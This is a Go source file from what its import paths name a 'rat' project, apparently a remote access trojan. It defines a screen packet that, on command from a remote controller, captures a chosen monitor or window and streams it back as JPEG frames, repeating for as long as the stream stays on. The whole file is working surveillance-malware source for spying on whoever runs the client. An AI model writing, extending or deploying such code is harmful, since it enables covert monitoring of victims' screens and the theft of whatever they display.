package main

import (
	"bytes"
	"image"
	"image/jpeg"
	"rat/client/screen"
	"rat/shared/network/header"

	"github.com/disintegration/imaging"
)

var screenStream bool
var monitor bool
var handle int
var scale float32

type ScreenPacket struct {
	Run     bool    `network:"receive"`
	Scale   float32 `network:"receive"`
	Monitor bool    `network:"receive"`
	Handle  int     `network:"receive"`
	Buffer  []byte  `network:"send"`
}

func (packet ScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (packet ScreenPacket) OnReceive() error {
	if packet.Run {
		// Dispatch one screen packet
		screenStream = false
		Queue <- &ScreenPacket{}
	}

	screenStream = packet.Run
	monitor = packet.Monitor
	handle = packet.Handle
	scale = packet.Scale

	return nil
}

func (packet *ScreenPacket) Init() {
	screen.QueryMonitors()

	var w bytes.Buffer

	var img image.Image

	if monitor {
		if handle >= len(screen.Monitors) {
			handle = 0
		}

		img = screen.Capture(screen.Monitors[handle])
	} else {
		img = screen.CaptureWindow(handle)
	}

	if img == nil {
		return
	}

	if scale > 0 && scale < 1.0 {
		width := float32(img.Bounds().Max.X) * scale
		height := float32(img.Bounds().Max.Y) * scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	packet.Buffer = w.Bytes()

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}
}
